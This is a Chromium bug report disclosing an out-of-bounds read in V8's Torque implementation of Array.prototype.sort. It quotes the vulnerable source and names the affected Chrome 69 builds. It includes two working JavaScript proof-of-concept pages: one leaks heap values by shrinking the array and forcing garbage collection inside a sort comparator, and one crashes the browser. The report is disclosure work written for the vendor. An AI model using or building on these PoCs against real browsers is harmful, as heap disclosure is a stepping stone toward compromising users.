<b>VULNERABILITY DETAILS</b>
https://cs.chromium.org/chromium/src/v8/src/builtins/array-sort.tq?rcl=dd5dd45db8522e2c7b3b3b9ae80132b6d0b8bc24&l=185
  macro ArrayInsertionSort<E : type>(
      context: Context, receiver: Object, elements: Object,
      initialReceiverMap: Object, initialReceiverLength: Number, from: Smi,
      to: Smi, userCmpFn: Object, sortCompare: CompareBuiltinFn)
  labels Bailout {
    for (let i: Smi = from + 1; i < to; ++i) {
      assert(CanUseSameAccessor<E>(
          context, receiver, initialReceiverMap, initialReceiverLength));

      let element: Object = Load<E>(context, elements, i) otherwise Bailout; // ***3***
      let j: Smi = i - 1;
      for (; j >= from; --j) {
        assert(CanUseSameAccessor<E>(
            context, receiver, initialReceiverMap, initialReceiverLength));

        let tmp: Object = Load<E>(context, elements, j) otherwise Bailout;
        let order: Number = CallCompareFn<E>(
            context, receiver, initialReceiverMap, initialReceiverLength,
            userCmpFn, sortCompare, tmp, element)
        otherwise Bailout;
        if (order > 0) {
          Store<E>(context, elements, j + 1, tmp);
        } else {
          break;
        }
      }
      Store<E>(context, elements, j + 1, element);
    }
  }

[...]

  macro ArrayQuickSortImpl<E : type>(
      context: Context, sortState: FixedArray, fromArg: Smi, toArg: Smi)
  labels Bailout {
[...]
    while (to - from > 1) { // ***2***
      if (to - from <= 10) {
        ArrayInsertionSort<E>(
            context, receiver, elements, initialReceiverMap,
            initialReceiverLength, from, to, userCmpFn, sortCompare)
        otherwise Bailout;
        break;
      }

[...]

      if ((to - high_start) < (low_end - from)) {
        ArrayQuickSort<E>(context, sortState, high_start, to); // ***1***
        to = low_end;
      } else {
        ArrayQuickSort<E>(context, sortState, from, low_end);
        from = high_start;
      }
    }
  }

After making a recursive call to |ArrayQuickSort|(1), |ArrayQuickSortImpl| doesn't ensure it still can use the fast
path to access the array. Therefore, in the next iteration of the loop(2), loads performed before the first call to
|CallCompareFn|(3) might read OOB data.

<b>VERSION</b>
Google Chrome 69.0.3452.0 (Official Build) dev (64-bit)
Google Chrome 69.0.3465.0 (Official Build) canary (64-bit) 

<b>REPRODUCTION CASE</b>
This repro case shows leaked heap values:
<script>
let floatArray = new Float64Array(1),
    intArray = new Uint32Array(floatArray.buffer);

function tohex(value) {
  floatArray[0] = value;
  return intArray[1].toString(16) + intArray[0].toString(16).padStart(8, "0");
}

function gc() {
  for (let i = 0; i < 1024 * 1024 / 0x10; i++) {
    let a = new String();
  }
}
rand = n => Math.floor(Math.random() * n);
check = a => a === undefined || a.toString().length < 6;

oobValues = [];

for (let i = 0; i < 1000; ++i) {
  array = [];
  let len = rand(30);
  for(let i = 0; i < len; ++i) {
    array[i] = i + 0.1;
  }

  counter = 0;
  array.sort((a, b) => {
    if (!check(a)) {
      oobValues.push(a);
    }
    if (!check(b)) {
      oobValues.push(b);
    }
    if (counter++ == rand(30)) {
      array.length = 1;
      gc();
    }
    return a - b;
  });
}

alert(oobValues.map(v => tohex(v)));
</script>


This one crashes Chrome:
<script>
function gc() {
  for (let i = 0; i < 1024 * 1024 / 0x10; i++) {
    let a = new String();
  }
}

rand = n => Math.floor(Math.random() * n);
for (let i = 0; i < 1000; ++i) {
  array = [];
  let len = rand(30);
  for(let i = 0; i < len; ++i) {
    array[i] = [i + 0.1];
  }

  counter = 0;
  array.sort((a, b) => {
    a = a || [0];
    b = b || [0];

    if (counter++ == rand(30)) {
      array.length = 1;
      gc();
    }
    return a[0] - b[0];
  });
}
</script>

The following assertion is hit in debug builds:
assert 'CanUseSameAccessor<E>( context, receiver, elements, initialReceiverMap, initialReceiverLength)' failed at ../../src/builtins/array-sort.tq:194:6